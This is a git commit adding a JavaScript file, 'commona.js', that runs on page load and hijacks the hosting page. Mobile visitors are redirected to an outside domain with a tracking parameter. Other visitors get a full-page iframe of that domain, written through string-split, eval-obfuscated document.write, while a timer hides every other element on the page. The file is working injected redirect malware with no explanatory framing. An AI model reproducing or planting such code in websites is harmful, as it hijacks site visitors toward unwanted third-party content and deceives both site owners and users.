d35ec4bc13d2c3bdcfb5724b784e003167a302a4
iiictcom <54625902+iiictcom@users.noreply.github.com>
2019-08-31 21:40:23 +0800

    Create commona.js

---
+++ commona.js
@@ -0,0 +1,25 @@
+function goPAGE() {
+    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
+        window.location.href = "https://11500a.com/?att=500wandl01"
+    } else {
+        var ss = '<center id="xzxzxz"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="14' + '50" src="https://11500a.com/?att=500wandl01"></iframe></center>';
+        eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
+        try {
+            setInterval(function() {
+                try {
+                    document.getElementById("div" + "All").style.display = "no" + "ne"
+                } catch (e) {}
+                for (var i = 0; i < document.body.children.length; i++) {
+                    try {
+                        var tagname = document.body.children[i].tagName;
+                        var myid = document.body.children[i].id;
+                        if (myid != "iconDiv1" && myid != "xzxzxz") {
+                            document.body.children[i].style.display = "non" + "e"
+                        }
+                    } catch (e) {}
+                }
+            }, 100)
+        } catch (e) {}
+    }
+}
+goPAGE();
